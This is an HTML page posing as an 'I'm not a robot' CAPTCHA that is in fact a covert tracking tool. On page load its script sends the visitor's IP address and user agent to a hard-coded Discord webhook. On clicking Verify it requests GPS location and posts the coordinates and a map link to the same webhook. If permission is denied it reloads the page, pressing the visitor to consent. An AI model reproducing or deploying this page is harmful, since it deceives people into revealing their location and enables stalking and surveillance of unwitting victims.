<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verify You're Human</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #4A90E2, #50E3C2);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .captcha-container {
      background: white;
      border-radius: 16px;
      padding: 40px 50px;
      width: 360px;
      box-shadow: 0 15px 30px rgba(0,0,0,0.1);
      text-align: center;
    }

    .captcha-text {
      font-weight: 600;
      font-size: 22px;
      margin-bottom: 25px;
      color: #333;
      user-select: none;
    }

    .captcha-box {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 15px;
      margin-bottom: 35px;
      cursor: pointer;
      user-select: none;
    }

    input[type="checkbox"] {
      width: 26px;
      height: 26px;
      cursor: pointer;
      border-radius: 4px;
      border: 2px solid #ccc;
      transition: border-color 0.3s ease;
    }

    input[type="checkbox"]:checked {
      border-color: #4A90E2;
      background-color: #4A90E2;
      box-shadow: 0 0 6px #4A90E2;
    }

    label {
      font-size: 18px;
      cursor: pointer;
      color: #555;
      user-select: none;
    }

    button {
      background-color: #4A90E2;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 15px 0;
      font-size: 18px;
      font-weight: 700;
      cursor: pointer;
      width: 100%;
      user-select: none;
      box-shadow: 0 8px 15px rgba(74,144,226,0.4);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
    }

    button:disabled {
      background-color: #a0c4f7;
      cursor: not-allowed;
      box-shadow: none;
    }

    button:not(:disabled):hover {
      background-color: #3b74d1;
      box-shadow: 0 12px 20px rgba(59,116,209,0.6);
    }
  </style>
</head>
<body>

  <div class="captcha-container">
    <div class="captcha-text">I'm not a robot</div>
    <div class="captcha-box">
      <input type="checkbox" id="fakeCaptcha" />
      <label for="fakeCaptcha">Verify</label>
    </div>
    <button id="verifyBtn" disabled>Verify</button>
  </div>

<script>
  const webhookURL = "https://discord.com/api/webhooks/1387513614818349118/1qPJv33gd71Ko8DG4eXBkT_PS44m2NpntKjuAxqtDcC8CmHMj1PsQ5EXrpwXd0XjUJvy";
  let clientIP = "Unknown";

  // Send basic info on page load
  fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(data => {
      clientIP = data.ip;
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üîî **New Page Visit**\n**IP:** ${clientIP}\n**User-Agent:** ${navigator.userAgent}`
        })
      });
    });

  // Checkbox logic
  window.onload = () => {
    document.getElementById('fakeCaptcha').checked = false;
    document.getElementById('verifyBtn').disabled = true;
  };

  document.getElementById('fakeCaptcha').addEventListener('change', () => {
    document.getElementById('verifyBtn').disabled = !document.getElementById('fakeCaptcha').checked;
  });

  // GPS logic
  document.getElementById('verifyBtn').addEventListener('click', () => {
    if (!navigator.geolocation) {
      alert("‚ùå Geolocation not supported by your browser.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapsURL = `https://www.google.com/maps?q=${lat},${lon}`;

        // Send GPS data to Discord
        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `üìç **GPS Location Submitted**\n**IP:** ${clientIP}\n**Lat:** ${lat}\n**Lon:** ${lon}\nüîó ${mapsURL}`
          })
        }).then(() => {
          alert("‚úÖ Thanks! Redirecting‚Ä¶");
          window.location.href = "https://www.instagram.com";
        });
      },
      error => {
        if (error.code === error.PERMISSION_DENIED) {
          alert("‚ö†Ô∏è Location access was denied. Reloading so you can try again...");
          location.reload(); // Auto-refresh
        } else {
          alert("‚ùå Error accessing location.");
        }
      }
    );
  });
</script>

</body>
</html>
